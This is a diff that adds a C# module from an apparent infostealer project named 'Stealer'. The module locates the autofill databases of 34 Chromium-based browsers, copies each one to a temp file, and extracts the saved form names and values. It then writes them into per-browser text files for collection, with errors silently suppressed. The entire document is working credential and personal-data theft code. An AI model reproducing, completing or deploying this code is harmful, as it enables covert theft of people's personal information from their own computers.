@@ -1,0 +1,102 @@
+﻿using System;
+using System.Collections.Generic;
+using System.IO;
+
+namespace Stealer.modules
+{
+  internal class Autofill
+  {
+    public static void GetCAutofills()
+    {
+      string str1 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
+      string str2 = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\";
+      string str3 = "\\User Data\\Default\\Web data";
+       string[] strArray1 = new string[34]
+            {
+        str2 + "Google\\Chrome" + str3,
+        str2 + "Google(x86)\\Chrome" + str3,
+        str2 + "Chromium" + str3,
+        str2 + "Microsoft\\Edge" + str3,
+        str1 + "Opera Software\\Opera Stable\\History",
+        str2 + "BraveSoftware\\Brave-Browser" + str3,
+        str2 + "Epic Privacy Browser" + str3,
+        str2 + "Amigo" + str3,
+        str2 + "AcWebBrowser" + str3,
+        str2 + "Flock" + str3,
+        str2 + "Black Hawk" + str3,
+        str2 + "Maple Studio" + str3,
+        str2 + "CoolNovo" + str3,
+        str2 + "Titan Browser" + str3,
+        str2 + "Baidu Spark" + str3,
+        str2 + "Vivaldi" + str3,
+        str2 + "Orbitum" + str3,
+        str2 + "Rockmelt" + str3,
+        str2 + "Mail.Ru\\Atom" + str3,
+        str2 + "CentBrowser" + str3,
+        str2 + "Kometa" + str3,
+        str2 + "Comodo\\Dragon" + str3,
+        str2 + "Torch" + str3,
+        str2 + "Comodo" + str3,
+        str2 + "Slimjet" + str3,
+        str2 + "360Browser\\Browser" + str3,
+        str2 + "Maxthon" + str3,
+        str2 + "K-Melon" + str3,
+        str2 + "Sputnik\\Sputnik" + str3,
+        str2 + "Nichrome" + str3,
+        str2 + "CocCoc\\Browser" + str3,
+        str2 + "uCozMedia\\Uran" + str3,
+        str2 + "Chromodo" + str3,
+        str2 + "Yandex\\YandexBrowser" + str3
+            };
+      List<string[]> strArrayList = new List<string[]>();
+      try
+      {
+        foreach (string str4 in strArray1)
+        {
+          if (File.Exists(str4))
+          {
+            string str5 = "";
+            foreach (string str6 in Help.BrowsersName)
+            {
+              if (str4.Contains(str6))
+                str5 = str6;
+            }
+            string str7 = Environment.GetEnvironmentVariable("temp") + "\\browserCreditCards";
+            if (File.Exists(str7))
+              File.Delete(str7);
+            File.Copy(str4, str7);
+            cSQLite cSqLite = new cSQLite(str7);
+            cSqLite.ReadTable("autofill");
+            for (int rowNum = 0; rowNum < cSqLite.GetRowCount(); ++rowNum)
+            {
+              string text1 = cSqLite.GetValue(rowNum, 0);
+              string text2 = cSqLite.GetValue(rowNum, 1);
+              if (!string.IsNullOrEmpty(text1))
+              {
+                string[] strArray2 = new string[3]
+                {
+                  Crypt.toUTF8(text1),
+                  Crypt.toUTF8(text2),
+                  str5
+                };
+                strArrayList.Add(strArray2);
+              }
+              else
+                break;
+            }
+          }
+        }
+      }
+      catch
+      {
+      }
+      string str8 = Program.path + "\\";
+      foreach (string[] strArray2 in strArrayList)
+      {
+        Directory.CreateDirectory(str8 + strArray2[2]);
+        using (StreamWriter streamWriter = new StreamWriter(str8 + strArray2[2] + "\\Autofill.txt", true))
+          streamWriter.WriteLine("\n[AUTOFILL]\nName: " + strArray2[0] + "\nValue: " + strArray2[1]);
+      }
+    }
+  }
+}
